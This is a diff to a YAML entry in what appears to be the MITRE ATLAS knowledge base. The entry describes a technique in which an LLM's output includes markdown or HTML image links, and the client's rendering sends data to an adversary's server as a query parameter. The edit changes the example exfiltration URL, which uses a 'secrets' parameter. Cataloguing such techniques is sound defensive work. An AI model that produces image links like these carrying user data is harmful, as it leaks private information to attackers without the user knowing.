@@ -2277,11 +2277,10 @@ matrices:
       \ clicks required. The image is hosted on an attacker-controlled website, allowing\
       \ the adversary to exfiltrate data through image request parameters. Variants\
       \ include HTML tags and markdown\n\nFor example, an LLM may produce the following\
-      \ markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=\"private\
-      \ data\")\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\"\
-      private data\">\n```\n\nWhen the request is received by the adversary's server\
-      \ hosting the requested image, they receive the contents of the `secrets` query\
-      \ parameter."
+      \ markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=private_data)\n\
+      ```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=private_data\"\
+      >\n```\n\nWhen the request is received by the adversary's server hosting the\
+      \ requested image, they receive the contents of the `secrets` query parameter."
     object-type: technique
     tactics:
     - AML.TA0010
